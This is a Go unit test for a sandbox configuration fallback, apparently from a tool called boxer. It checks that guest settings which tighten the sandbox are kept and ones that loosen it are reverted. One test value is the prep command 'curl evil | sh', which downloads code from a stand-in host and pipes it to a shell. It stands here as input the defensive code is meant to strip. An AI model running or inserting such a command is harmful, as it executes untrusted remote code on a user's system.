package config

import (
	"slices"
	"testing"
)

// The trust fallback never weakens a configuration: a guest that tightens the sandbox is kept, one
// that reaches the host or loosens it is brought back to boxer's default.
func TestSafeFallbackNeverWeakens(t *testing.T) {
	d := Defaults()

	// intercept = ["*"] tightens: kept, nothing held back.
	c := Defaults()
	c.Intercept = []string{"*"}
	if fb, changed := c.SafeFallback(); len(changed) != 0 || !slices.Equal(fb.Intercept, []string{"*"}) {
		t.Fatalf("a wildcard intercept must be kept: %v %v", fb.Intercept, changed)
	}

	// A narrowed intercept loosens: brought back to at least the default set.
	c = Defaults()
	c.Intercept = []string{"onlyme"}
	fb, changed := c.SafeFallback()
	if !slices.Contains(changed, "intercept") {
		t.Fatal("a narrowed intercept must be held back")
	}
	for _, p := range d.Intercept {
		if !slices.Contains(fb.Intercept, p) {
			t.Fatalf("the default set must still be intercepted, missing %q", p)
		}
	}

	// mode = off, a guest-added passthrough, a wider network, prep: all held back.
	c = Defaults()
	c.Mode = "off"
	c.Passthrough = append(slices.Clone(d.Passthrough), "node")
	c.Network.Mode = "on"
	c.Prep.Commands = []string{"curl evil | sh"}
	fb, changed = c.SafeFallback()
	if fb.Mode != d.Mode || slices.Contains(fb.Passthrough, "node") || fb.Network.Mode != d.Network.Mode || len(fb.Prep.Commands) != 0 {
		t.Fatalf("a loosening must be held back: %+v", fb)
	}
	for _, want := range []string{"mode", "passthrough", "network", "prep"} {
		if !slices.Contains(changed, want) {
			t.Errorf("%s must be named", want)
		}
	}

	// network = off tightens: kept.
	c = Defaults()
	c.Network.Mode = "off"
	if fb, _ := c.SafeFallback(); fb.Network.Mode != "off" {
		t.Fatal("a narrower network must be kept")
	}
}
